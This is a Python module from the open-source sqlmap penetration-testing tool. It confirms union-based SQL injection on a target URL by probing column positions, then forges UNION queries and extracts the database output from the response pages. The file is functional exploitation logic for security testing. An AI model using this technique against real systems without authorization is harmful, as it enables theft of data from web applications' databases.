#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2006-2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>
                        and Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



import time

from lib.core.agent import agent
from lib.core.common import randomStr
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import temp
from lib.core.exception import sqlmapUnsupportedDBMSException
from lib.core.session import setUnion
from lib.core.unescaper import unescaper
from lib.parse.html import htmlParser
from lib.request.connect import Connect as Request
from lib.techniques.inband.union.test import unionTest


def __unionPosition(count, expression, negative=False):
    if negative:
        negLogMsg = "partial"
    else:
        negLogMsg = "full"

    logMsg  = "confirming %s inband sql injection on parameter " % negLogMsg
    logMsg += "'%s'" % kb.injParameter
    logger.info(logMsg)

    # For each column of the table (# of NULL) perform a request using
    # the UNION ALL SELECT statement to test it the target url is
    # affected by an exploitable inband SQL injection vulnerability
    for exprPosition in range(0, kb.unionCount):
        # Prepare expression with delimiters
        randQuery = randomStr()
        randQueryProcessed = agent.concatQuery("\'%s\'" % randQuery)
        randQueryUnescaped = unescaper.unescape(randQueryProcessed)

        if len(randQueryUnescaped) > len(expression):
            blankCount = len(randQueryUnescaped) - len(expression)
            expression = (" " * blankCount) + expression
        elif len(randQueryUnescaped) < len(expression):
            blankCount = len(expression) - len(randQueryUnescaped)
            randQueryUnescaped = (" " * blankCount) + randQueryUnescaped

        # Forge the inband SQL injection request
        query = agent.forgeInbandQuery(randQueryUnescaped, exprPosition)
        payload = agent.payload(newValue=query, negative=negative)

        # Perform the request
        resultPage = Request.queryPage(payload, content=True)
        count += 1

        # We have to assure that the randQuery value is not within the
        # HTML code of the result page because, for instance, it is there
        # when the query is wrong and the back-end DBMS is Microsoft SQL
        # server
        htmlParsed = htmlParser(resultPage)

        if randQuery in resultPage and not htmlParsed:
            setUnion(position=exprPosition)

            break

    if isinstance(kb.unionPosition, int):
        logMsg  = "the target url is affected by an exploitable "
        logMsg += "%s inband sql injection vulnerability" % negLogMsg
        logger.info(logMsg)
    else:
        warnMsg  = "the target url is not affected by an exploitable "
        warnMsg += "%s inband sql injection vulnerability" % negLogMsg

        if negLogMsg == "partial":
            warnMsg += ", sqlmap will retrieve the expression output "
            warnMsg += "through blind sql injection technique"

        logger.warn(warnMsg)

    return count


def unionUse(expression):
    """
    This function tests for an inband SQL injection on the target
    url then call its subsidiary function to effectively perform an
    inband SQL injection on the affected url
    """

    count    = 0
    origExpr = expression
    start    = time.time()

    if not kb.unionCount:
        unionTest()

    if not kb.unionCount:
        return

    # Prepare expression with delimiters
    expression = agent.concatQuery(expression)
    expression = unescaper.unescape(expression)

    # Confirm the inband SQL injection and get the exact column
    # position only once
    if not isinstance(kb.unionPosition, int):
        count = __unionPosition(count, expression)

        # Assure that the above function found the exploitable full inband
        # SQL injection position
        if not isinstance(kb.unionPosition, int):
            count = __unionPosition(count, expression, True)

            # Assure that the above function found the exploitable partial
            # inband SQL injection position
            if not isinstance(kb.unionPosition, int):
                return
            else:
                conf.paramNegative = True

    # TODO: if conf.paramNegative == True and query can returns multiple
    # entries, get once per time in a for cycle, see lib/request/inject.py
    # like for --sql-query and --sql-shell

    # Forge the inband SQL injection request
    query = agent.forgeInbandQuery(expression)
    payload = agent.payload(newValue=query)

    logMsg = "query: %s" % query
    logger.info(logMsg)

    # Perform the request
    resultPage = Request.queryPage(payload, content=True)
    count += 1

    if temp.start not in resultPage or temp.stop not in resultPage:
        return

    duration = int(time.time() - start)

    logMsg = "performed %d queries in %d seconds" % (count, duration)
    logger.info(logMsg)

    # Parse the returned page to get the exact inband
    # sql injection output
    startPosition = resultPage.index(temp.start)
    endPosition = resultPage.rindex(temp.stop) + len(temp.stop)
    value = str(resultPage[startPosition:endPosition])

    return value
